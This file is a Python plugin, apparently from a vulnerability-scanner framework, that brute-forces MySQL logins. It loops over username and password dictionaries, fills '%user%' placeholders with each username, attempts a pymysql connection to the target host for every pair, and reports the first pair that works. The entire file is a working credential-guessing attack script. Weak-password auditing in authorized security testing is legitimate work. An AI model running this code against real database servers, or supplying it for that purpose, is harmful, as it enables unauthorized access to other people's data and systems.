#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import socket
import pymysql
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.MYSQL
        self.name = 'mysql burst'
        self.keyword = ['mysql', 'burst']
        self.info = 'Burst mysql weakpass.'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)


    def prove(self):
        socket.setdefaulttimeout(5)
        usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(
            'dict/mysql_usernames.txt')
        passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(
            'dict/mysql_passwords.txt')
        for linef1 in usernamedic:
            username = linef1.strip('\r').strip('\n')
            for linef2 in passworddic:
                try:
                    password = (
                        linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                        '\r').strip('\n')
                    pymysql.connect(self.target_host, username, password, port=self.target_port, connect_timeout= 5)
                    self.flag = 1
                    self.res.append({"info": username + "/" + password,"key": "mysql burst"})
                    return
                except Exception as e:
                    if "Errno 10061" in str(e) or "timed out" in str(e): return